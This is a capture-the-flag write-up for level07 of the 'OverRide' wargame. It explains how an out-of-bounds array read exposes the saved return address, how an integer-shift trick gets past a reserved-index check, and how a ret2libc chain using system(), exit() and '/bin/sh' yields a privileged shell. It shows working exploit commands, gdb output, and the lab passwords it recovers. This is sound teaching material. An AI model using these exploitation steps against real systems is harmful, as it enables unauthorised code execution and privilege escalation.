# Underflow and ret2libc

```shell
┌──$ [~/42/2022/override]
└─>  ssh 192.168.56.101 -p 4242 -l level07
           ____                  ____  _     __
          / __ \_   _____  _____/ __ \(_)___/ /__
         / / / / | / / _ \/ ___/ /_/ / / __  / _ \
        / /_/ /| |/ /  __/ /  / _, _/ / /_/ /  __/
        \____/ |___/\___/_/  /_/ |_/_/\__,_/\___/

                       Good luck & Have fun

   To start, ssh with level00/level00 on 192.168.56.101:4242
level07@192.168.56.101's password: GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level07/level07
```

The program wipes arguments and environment variables. It creates a static array of 400 bytes fo data of storage. It executes a loop prompting the user to enter the command to execute: `store`, `read` or `quit`.
`store_number()` receives a pointer to `data` array and store a number to the given index. Indexes which are modulo 3 and 183rd index are reserved and cannot be assignable.
`read_number()` receive a pointer to `data` array and read the number stored in the given index.
In case of successful execution of command, `main()` prints corresponding message, as well as for unsuccessful execution.
The last instruction zeroing out memory of `command` and it loop again asking the user a command.

`read_number()` do not check if input index, so it allow to read out of boundaries of `data` array. Over 694rd index, program crash with segfault.
```shell
level07@OverRide:~$ ./payload.py --max 1000 | ./level07
[...]
Input command:  Index:  Number at data[693] is 0
 Completed read command successfully
Input command:  Index:  Number at data[694] is 0
 Completed read command successfully
Input command:  Index: Segmentation fault (core dumped)
```
Saved EIP on `main()` function is `0xf7e45513`. While reading out of boundaries of array saved `EIP` should appear.
```gdb
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0xf7fceff4 --> 0x1a2d7c
ECX: 0xffffd600 --> 0x0
EDX: 0xffffd600 --> 0x0
ESI: 0x0
EDI: 0x0
EBP: 0x0
ESP: 0xffffd6bc --> 0xf7e45513 (<__libc_start_main+243>:        mov    DWORD PTR [esp],eax)
EIP: 0x80489f1 (<main+718>:     ret)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80489ee <main+715>:        pop    esi
   0x80489ef <main+716>:        pop    edi
   0x80489f0 <main+717>:        pop    ebp
=> 0x80489f1 <main+718>:        ret
   0x80489f2:   nop
   0x80489f3:   nop
   0x80489f4:   nop
   0x80489f5:   nop
[------------------------------------stack-------------------------------------]
0000| 0xffffd6bc --> 0xf7e45513 (<__libc_start_main+243>:       mov    DWORD PTR [esp],eax)
0004| 0xffffd6c0 --> 0x1
0008| 0xffffd6c4 --> 0xffffd754 --> 0xffffd88f --> 0x0
0012| 0xffffd6c8 --> 0xffffd75c --> 0xffffd8ab --> 0x0
0016| 0xffffd6cc --> 0xf7fd3000 --> 0xf7e2c000 --> 0x464c457f
0020| 0xffffd6d0 --> 0x0
0024| 0xffffd6d4 --> 0xffffd71c --> 0xf7ffcff4 --> 0x20f1c
0028| 0xffffd6d8 --> 0xffffd75c --> 0xffffd8ab --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
gdb-peda$ info frame
Stack level 0, frame at 0xffffd6c0:
 eip = 0x80489f1 in main; saved eip 0xf7e45513
 called by frame at 0xffffd730
 Arglist at unknown address.
 Locals at unknown address, Previous frame's sp is 0xffffd6c0
 Saved registers:
  eip at 0xffffd6bc
gdb-peda$ x/wx 0xffffd6bc
0xffffd6bc:     0xf7e45513
```
Indeed, on reading 1000 bytes, `EIP` it can be seen.
```shell
level07@OverRide:~$ ./payload.py --max 500 | ./level07 | grep -o "Number at data.*$" | cut -d' ' -f5 | sort -hu | sed 's/^/printf "0x%08x" /e' | grep 0xf7e45513
0xf7e45513
level07@OverRide:~$
```
Or without `payload.py`
```shell
level07@OverRide:~$ python -c "print(0xf7e45513)"
4158936339
level07@OverRide:~$ for i in {0..500}; do (echo read; echo $i; echo quit) | ./level07 | if [ $(grep -oE '[0-9]+$') -eq 4158936339 ]; then echo "EIP is on index $i"; fi; done
EIP is on index 114
```

While reading/storing a number from data storage, the index is used to determine the absolute address from where to read/write strating from beggining of `data` array.
```
data[index<<2] = number
```
On writting to index 1 it will write to `data[1 << 2] = number`, same as `data[4] = number` .
On writting to index 114 it will write to `data[114 << 2] = number`, same as `data[456] = number` .

In the binary representation (32 bits), value `114` looks like:
```
0000 0000   0000 0000   0000 0000   0111 0010
```
Shift operation is destructive. Excess bits shifted off to the left are discarded, and zero bits are shifted in from the right.
Knowing that `store_number()` use rigth-shift operation (multiplication x4) `data[index << 2] = number`, first two MSB bits can be set switch on.

In the first time it will make pass the condition %3, and in the second time at the time of <<2 will result in index 456
| Binary value                                    | Decimal value  | Modulo result | Usable | Binary value after shift <<2                    | Decimal value after shift <<2 |
|-------------------------------------------------|----------------|---------------|--------|-------------------------------------------------|-------------------------------|
| `0100 0000   0000 0000   0000 0000   0111 0010` | 1073741938     | 1             | Yes    | `0000 0000   0000 0000   0000 0001   1100 1000` | 456                           |
| `1000 0000   0000 0000   0000 0000   0111 0010` | 2147483762     | 2             | Yes    | `0000 0000   0000 0000   0000 0001   1100 1000` | 456                           |
| `1100 0000   0000 0000   0000 0000   0111 0010` | 3221225586     | 0             | No     | `0000 0000   0000 0000   0000 0001   1100 1000` | 456                           |

Retrieve `system()`, `exit()` and `"/bin/sh"` addresses.
```gdb
[...]
gdb-peda$ print system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
gdb-peda$ print exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f897ec ("/bin/sh")
```
Convert them to decimal values.
```gdb
gdb-peda$ p/d 0xf7e6aed0
$3 = 4159090384
gdb-peda$ p/d 0xf7e5eb70
$4 = 4159040368
gdb-peda$ p/d 0xf7f897ec
$5 = 4160264172
```
Decimal values can be stored in data storage following by `quit` command to return from `main()` into a new shell process.

| Value     | Address     | Decimal value | Index                      |
|-----------|-------------|---------------|----------------------------|
| system()  | 0xf7e6aed0  | 4159090384    | 114(1073741938,2147483762) |
| exit()    | 0xf7e5eb70  | 4159040368    | 115                        |
| "/bin/sh" | 0xf7f897ec  | 4160264172    | 116                        |

# Exploit
With index 1073741938
```shell
level07@OverRide:~$ (echo -e "store\n4159090384\n1073741938\nstore\n4159040368\n115\nstore\n4160264172\n116\nquit"; cat -) | ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
id
uid=1007(level07) gid=1007(level07) euid=1008(level08) egid=100(users) groups=1008(level08),100(users),1007(level07)
cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
With index 2147483762
```shell
level07@OverRide:~$ (echo -e "store\n4159090384\n2147483762\nstore\n4159040368\n115\nstore\n4160264172\n116\nquit"; cat -) | ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
id
uid=1007(level07) gid=1007(level07) euid=1008(level08) egid=100(users) groups=1008(level08),100(users),1007(level07)
cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
